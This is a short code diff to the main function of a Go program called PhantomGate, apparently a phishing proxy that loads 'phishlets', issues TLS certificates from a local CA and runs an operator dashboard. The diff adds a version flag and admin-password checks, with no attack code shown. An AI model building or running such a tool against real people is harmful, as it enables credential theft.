@@ -82,7 +82,14 @@ func main() {
 	useCA := flag.Bool("use-ca", false, "Generate dynamic TLS certificates signed by a local CA")
 	captivePortalFlag := flag.Bool("captive-portal", false, "Enable captive portal for CA cert distribution")
 
+	showVersion := flag.Bool("version", false, "Print version and exit")
+
 	flag.Parse()
+
+	if *showVersion {
+		fmt.Printf("PhantomGate v%s\n", version)
+		os.Exit(0)
+	}
 
 	fmt.Printf(banner, version)
 
@@ -176,6 +183,14 @@ func main() {
 	activePhishlet, ok := pm.Get(*phishletName)
 	if !ok {
 		log.Fatalf("[FATAL] Phishlet '%s' not found. Use --list to see available phishlets.", *phishletName)
+	}
+
+	// Validate admin password
+	if cfg.AdminPass == "" || cfg.AdminPass == "changeme" {
+		log.Fatal("[FATAL] --admin-pass is required and must not be 'changeme'. Set a strong password for the operator dashboard.")
+	}
+	if len(cfg.AdminPass) < 8 {
+		log.Println("[⚠️  WARNING] Admin password is shorter than 8 characters. Consider using a stronger password.")
 	}
 
 	// Initialize data store
